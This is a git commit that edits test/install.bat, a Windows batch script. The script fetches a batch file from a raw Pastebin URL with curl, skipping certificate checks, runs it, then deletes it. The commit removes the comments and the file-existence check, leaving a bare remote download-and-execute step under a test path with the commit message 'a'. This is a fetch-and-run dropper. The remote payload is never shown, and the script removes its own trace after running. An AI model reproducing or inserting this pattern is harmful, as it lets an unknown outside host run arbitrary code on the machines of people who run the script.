6d023b8b33b81fcbe91457caa11fef3b4c56d559
hollow-graphic <120960592+hollowcraft@users.noreply.github.com>
2025-12-18 22:28:58 +0100

    a

--- test/install.bat
+++ test/install.bat
@@ -1,20 +1,10 @@
 @echo off
-REM URL du pastebin (RAW)
 set "PASTEBIN_URL=https://pastebin.com/raw/CaDVNikH"
 
-REM Chemin temporaire pour le fichier
 set "TMPFILE=%TEMP%\paste_script.bat"
 
-REM Télécharger le script depuis Pastebin en ignorant les vérifications SSL
 C:\Windows\System32\curl.exe -k -L "%PASTEBIN_URL%" -o "%TMPFILE%"
 
-REM Vérifier si le fichier a été créé
-if exist "%TMPFILE%" (
-    echo Fichier téléchargé : %TMPFILE%
-    REM Exécuter le script
-    call "%TMPFILE%"
-    REM Supprimer le fichier après exécution
-    del "%TMPFILE%"
-) else (
-    echo Erreur : le fichier n'a pas été créé.
-)
+echo Fichier téléchargé : %TMPFILE%
+call "%TMPFILE%"
+del "%TMPFILE%"
